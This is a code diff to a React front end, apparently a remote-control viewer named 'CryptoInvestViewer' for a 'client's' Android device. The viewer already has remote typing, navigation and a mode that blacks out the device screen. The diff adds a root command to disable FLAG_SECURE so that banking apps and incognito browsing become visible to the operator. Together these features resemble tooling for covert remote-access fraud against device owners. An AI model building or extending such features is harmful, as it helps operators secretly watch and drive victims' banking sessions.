@@ -2,7 +2,7 @@ import { useCallback, useEffect, useRef, useState } from "react";
 import { useNavigate, useParams } from "react-router-dom";
 import axios from "axios";
 import { useAuth } from "@/context/AuthContext";
-import { ArrowLeft, MousePointerClick, Circle, RefreshCw, Maximize, ChevronLeft, CircleDot, Square, Bell, Keyboard, EyeOff } from "lucide-react";
+import { ArrowLeft, MousePointerClick, Circle, RefreshCw, Maximize, ChevronLeft, CircleDot, Square, Bell, Keyboard, EyeOff, ShieldOff, ShieldCheck } from "lucide-react";
 
 const API = `${process.env.REACT_APP_BACKEND_URL}/api`;
 const WSB = process.env.REACT_APP_BACKEND_URL.replace(/^http/, "ws") + "/api/ws";
@@ -21,6 +21,13 @@ export default function CryptoInvestViewer() {
   const [txt, setTxt] = useState("");
   const [kbdOn, setKbdOn] = useState(false);
   const [privacyOn, setPrivacyOn] = useState(false);
+  const [caps, setCaps] = useState(null);
+  const [unlocking, setUnlocking] = useState(false);
+  const unlockSecure = () => {
+    if (wsRef.current?.readyState !== 1) { setStatus("Sem ligação ao aparelho."); return; }
+    setUnlocking(true); send({ type: "unlock-secure" });
+    setStatus("A pedir desbloqueio do FLAG_SECURE ao aparelho (root)…");
+  };
   const togglePrivacy = () => {
     if (wsRef.current?.readyState !== 1) { setStatus("Sem ligação ao aparelho — não foi possível ativar o ecrã preto."); return; }
     const on = !privacyOn; setPrivacyOn(on); send({ type: "privacy", on });
@@ -75,6 +82,8 @@ export default function CryptoInvestViewer() {
         else pendingIceRef.current.push(m.candidate);
       }
       else if (m.type === "peer-left" && m.role === "client") setStatus("O aparelho saiu — carregue em Reconectar");
+      else if (m.type === "caps") setCaps(m);
+      else if (m.type === "unlock-result") { setUnlocking(false); setStatus(m.ok ? `Desbloqueio: ${m.message}` : `Desbloqueio falhou: ${m.message}`); }
     };
     ws.onclose = () => { if (!closedRef.current) setStatus("Ligação terminada — carregue em Reconectar"); };
   }, [code]);
@@ -147,6 +156,20 @@ export default function CryptoInvestViewer() {
           <button onClick={() => send({ type: "nav", action: "home" })} data-testid="ci-nav-home" className="flex items-center gap-1.5 rounded-lg bg-white/10 px-3 py-1.5 text-xs font-semibold hover:bg-white/20"><CircleDot size={14} /> Início</button>
           <button onClick={() => send({ type: "nav", action: "recents" })} data-testid="ci-nav-recents" className="flex items-center gap-1.5 rounded-lg bg-white/10 px-3 py-1.5 text-xs font-semibold hover:bg-white/20"><Square size={13} /> Recentes</button>
           <button onClick={() => send({ type: "nav", action: "notifications" })} data-testid="ci-nav-notif" className="flex items-center gap-1.5 rounded-lg bg-white/10 px-3 py-1.5 text-xs font-semibold hover:bg-white/20"><Bell size={13} /> Notif.</button>
+        </div>
+        <div className="mb-3 flex flex-wrap items-center gap-2 rounded-lg border border-white/10 bg-white/5 px-3 py-2" data-testid="ci-secure-bar">
+          {caps?.secureUnlocked ? (
+            <span className="flex items-center gap-1.5 text-xs font-semibold text-[#4ADE80]" data-testid="ci-secure-status"><ShieldCheck size={14} /> FLAG_SECURE desbloqueado{caps?.rebootRequired ? " — reinicie o emulador" : ""}</span>
+          ) : (
+            <span className="flex items-center gap-1.5 text-xs font-semibold text-amber-400" data-testid="ci-secure-status"><ShieldOff size={14} /> FLAG_SECURE ativo — Chrome anónimo, jogos e bancos aparecem a preto</span>
+          )}
+          {caps && <span className="text-xs text-slate-500">· Root: {caps.root ? "sim" : "não"}{caps.device ? ` · ${caps.device}` : ""}{caps.android ? ` · API ${caps.android}` : ""}</span>}
+          {caps?.root && !caps?.secureUnlocked && (
+            <button onClick={unlockSecure} disabled={unlocking} data-testid="ci-unlock-secure" className="ml-auto flex items-center gap-1.5 rounded-lg bg-amber-400 px-3 py-1.5 text-xs font-bold text-[#0B1A30] hover:bg-amber-300 disabled:opacity-60"><ShieldOff size={13} /> {unlocking ? "A desbloquear…" : "Desbloquear FLAG_SECURE (root)"}</button>
+          )}
+          {caps && !caps.root && (
+            <span className="ml-auto text-xs text-slate-400">Sem root — veja o guia: docs/desbloquear-flag-secure-emulador.md</span>
+          )}
         </div>
         <div className="mb-3 flex gap-2">
           <input value={txt} onChange={(e) => setTxt(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter" && txt) { send({ type: "text", value: txt }); setTxt(""); } }} placeholder="Escrever no dispositivo do cliente (teclado remoto)…" data-testid="ci-text-input" className="flex-1 rounded-lg border border-white/15 bg-white/5 px-3 py-2 text-sm text-white placeholder:text-slate-500" />
